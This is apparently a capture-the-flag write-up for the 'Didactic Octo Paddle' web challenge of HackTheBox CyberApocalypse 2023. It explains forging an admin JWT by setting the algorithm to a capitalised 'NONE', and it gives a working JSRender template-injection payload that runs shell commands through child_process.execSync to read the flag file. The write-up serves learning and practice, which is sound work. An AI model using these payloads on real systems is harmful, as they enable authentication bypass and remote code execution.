# HTB-CA23
HackTheBox CyberApocalypse 2k23 writeups (Rowra)


## Web Didactic Octo Paddle
* in `middleware/AdminMiddleware.js` you can notice the `else` clause in which `jwt.verify` func. call's 2nd parameter is `null`. This means there's not crypt involved. This obviously means very easily crafted JWTs
* the only `algorithm` matching this is `none`, however, the code's supposed to defend against that with an early return in the code
* with some trial & error I managed to bypass the mentioned early return by using the algorithm `NONE` _(capital)_. Meaning the actual working payload as follows _(parts are separated by a `.` dot)_:
1st part: `echo -n '{"typ":"JWT","alg":"NONE"}' | base64`
2nd part: the one you already have, just change `id` to `1` _(admin's id)_
3rd part: empty _(nothing following the `.`)_
* as the webapp's admin, still need to access `/flag.txt`. The code rendering `/admin` endpoint uses `JSRender NodeJS`. All that was left to do is to register a user with a username that's exploiting SSTI and then check `/admin` page for the flag. Working payload:
`{"username":"{{:\"pwnd\".toString.constructor.call({},\"return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt').toString()\")()}}","password":"fdg"}`

##
